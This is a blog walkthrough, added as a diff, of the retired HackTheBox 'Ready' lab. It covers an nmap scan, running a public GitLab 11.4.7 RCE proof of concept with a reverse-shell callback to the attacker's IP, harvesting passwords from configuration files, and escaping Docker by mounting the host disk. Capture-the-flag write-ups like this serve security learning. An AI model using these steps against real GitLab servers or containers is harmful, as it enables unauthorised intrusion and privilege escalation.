@@ -1,0 +1,205 @@
+---
+layout: walkthrough
+title: HackTheBox - Ready
+date: 2021-05-16 12:00:00 +0200
+img: ChallengeVMs/HTB_Icons/ready.png # Add image post (optional)
+status: Retired
+description: Hi all, My name is Kyhle Öhlinger and this blog post forms part of my personal blog. If you enjoy any of the posts, feel free to reach out and let me know :) 
+---
+
+Hi everyone, today we are going to be looking at Ready --`10.10.10.220`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Ready/Overview.png"  style="width: 65%" />
+</p>
+
+## Information Gathering
+
+In order to start the VM, I started with the Information gathering phase. Let's begin with a Nmap Scan.
+
+### Nmap Output
+
+<details>
+
+```bat
+vagrant@ko:~/Desktop/HackTheBox/Ready$ nmap -sC -sV 10.10.10.220
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-15 09:23 EDT
+Nmap scan report for 10.10.10.220
+Host is up (0.18s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+5080/tcp open  http    nginx
+| http-robots.txt: 53 disallowed entries (15 shown)
+| / /autocomplete/users /search /api /admin /profile 
+| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
+|_/s/ /snippets/new /snippets/*/edit
+| http-title: Sign in \xC2\xB7 GitLab
+|_Requested resource was http://10.10.10.220:5080/users/sign_in
+|_http-trane-info: Problem with XML parsing of /evox/about
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 46.31 seconds
+
+```
+
+</details>
+
+From the output shown above, we can see that the machine is a Linux machine and I added `ready.htb` to the `/etc/hosts` file. As this is a Linux machine and it only has 2 open ports, I started by navigating to the `robots.txt` file on port 5080 which was identified by the nmap scan, the contents are provided below:
+
+<details>
+
+```text
+# See http://www.robotstxt.org/robotstxt.html for documentation on how to use the robots.txt file
+#
+# To ban all spiders from the entire site uncomment the next two lines:
+# User-Agent: *
+# Disallow: /
+
+# Add a 1 second delay between successive requests to the same server, limits resources used by crawler
+# Only some crawlers respect this setting, e.g. Googlebot does not
+# Crawl-delay: 1
+
+# Based on details in https://gitlab.com/gitlab-org/gitlab-ce/blob/master/config/routes.rb, https://gitlab.com/gitlab-org/gitlab-ce/blob/master/spec/routing, and using application
+User-Agent: *
+Disallow: /autocomplete/users
+Disallow: /search
+Disallow: /api
+Disallow: /admin
+Disallow: /profile
+Disallow: /dashboard
+Disallow: /projects/new
+Disallow: /groups/new
+Disallow: /groups/*/edit
+Disallow: /users
+Disallow: /help
+# Only specifically allow the Sign In page to avoid very ugly search results
+Allow: /users/sign_in
+
+# Global snippets
+User-Agent: *
+Disallow: /s/
+Disallow: /snippets/new
+Disallow: /snippets/*/edit
+Disallow: /snippets/*/raw
+
+# Project details
+User-Agent: *
+Disallow: /*/*.git
+Disallow: /*/*/fork/new
+Disallow: /*/*/repository/archive*
+Disallow: /*/*/activity
+Disallow: /*/*/new
+Disallow: /*/*/edit
+Disallow: /*/*/raw
+Disallow: /*/*/blame
+Disallow: /*/*/commits/*/*
+Disallow: /*/*/commit/*.patch
+Disallow: /*/*/commit/*.diff
+Disallow: /*/*/compare
+Disallow: /*/*/branches/new
+Disallow: /*/*/tags/new
+Disallow: /*/*/network
+Disallow: /*/*/graphs
+Disallow: /*/*/milestones/new
+Disallow: /*/*/milestones/*/edit
+Disallow: /*/*/issues/new
+Disallow: /*/*/issues/*/edit
+Disallow: /*/*/merge_requests/new
+Disallow: /*/*/merge_requests/*.patch
+Disallow: /*/*/merge_requests/*.diff
+Disallow: /*/*/merge_requests/*/edit
+Disallow: /*/*/merge_requests/*/diffs
+Disallow: /*/*/project_members/import
+Disallow: /*/*/labels/new
+Disallow: /*/*/labels/*/edit
+Disallow: /*/*/wikis/*/edit
+Disallow: /*/*/snippets/new
+Disallow: /*/*/snippets/*/edit
+Disallow: /*/*/snippets/*/raw
+Disallow: /*/*/deploy_keys
+Disallow: /*/*/hooks
+Disallow: /*/*/services
+Disallow: /*/*/protected_branches
+Disallow: /*/*/uploads/
+
+```
+</details>
+
+There were way to many directories listed, so I started by navigating to the web application's main page. I created an account for Gitlab and authenticated to the application:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Ready/img1.png"  style="width: 80%" />
+</p>
+
+
+There didn't appear to be any publicly available Projects or Groups, so I decided to look at the version which was `GitLab Community Edition 11.4.7`.  A simple Google search lead me to a publicly available RCE PoC: <https://github.com/ctrlsam/GitLab-11.4.7-RCE> which I exploited with the following command:
+
+```bash
+vagrant@ko:~/Desktop/HackTheBox/Ready/GitLab-11.4.7-RCE$ python3 exploit.py -u hotshoto -p hotshoto@test.com -g http://10.10.10.220 -l 10.10.14.82 -P 1234
+[+] authenticity_token: fxQVMRlKcvnRZ2jXkG4b5kTm+LyeR/8iTFiw81uylzURDcuXan4efwJTmbqb+jBHInKj+TAMOWnC2FH9CUpMTg==
+[+] Creating project with random name: project910
+[+] Running Exploit
+[+] Exploit completed successfully!
+```
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Ready/img2.png"  style="width: 80%" />
+</p>
+
+[LiveOverflow](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/) have a really good breakdown of the vulnerability which exploits Server Side Request Forgery (SSRF) targeting redis for RCE via IPv6/IPv4 address embedding chained with Carriage Return and Line Feed (CRLF) injection in the `git://` protocol.
+
+## Lateral Movement using Git
+With access to the host, I began performing some basic enumeration as shown below:
+
+<details>
+
+```bash
+echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a; echo " ";echo "groups:";groups;
+ 
+uname -a:
+Linux gitlab.example.com 5.4.0-40-generic #44-Ubuntu SMP Tue Jun 23 00:01:04 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 
+hostname:
+gitlab.example.com
+ 
+id
+uid=998(git) gid=998(git) groups=998(git)
+ 
+ifconfig:
+ 
+groups:
+git
+```
+</details>
+
+Looking at the main directory, there was a file named `root_pass` which contained the following potential password `YG65407Bjqvv9A0a8Tm_7w`, however I was not able to elevate my privileges using the password. I loaded linpeas onto the machine and made mention of an `/opt/backup` directory. Within the directory, there is a `gitlab.rb` file which contained additional credentials: `gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"`. Using this password, I was able to authenticate to the root user:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Ready/img3.png"  style="width: 80%" />
+</p>
+
+## Privilege Escalation using Docker Breakout
+
+This isn't the end though, I was in a docker container. Looking at the `root` directory, I came across a `.viminfo` file which had file marks referring to:
+
+* `/opt/gitlab/embedded/service/gitlab-rails/lib/gitlab/utils.rb`
+* `/opt/gitlab/embedded/service/gitlab-rails/lib/gitlab/gfm/uploads_rewriter.rb`
+
+The files themselves didn't contain any useful information. Since I was in a Docker container, I loaded DeepCE onto the machine which identified a privilege escalation vector by simply mounting the fileshare using the commands shown below:
+
+<details>
+
+```bat
+root@gitlab:/tmp# mount /dev/sda2 /tmp/test 
+mount /dev/sda2 /tmp/test
+root@gitlab:/tmp# cd /tmp/test/root
+cd /tmp/test/root
+root@gitlab:/tmp/test/root# ls
+ls
+docker-gitlab  ready-channel  root.txt  snap
+root@gitlab:/tmp/test/root# 
+```
+</details>
+
+That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.
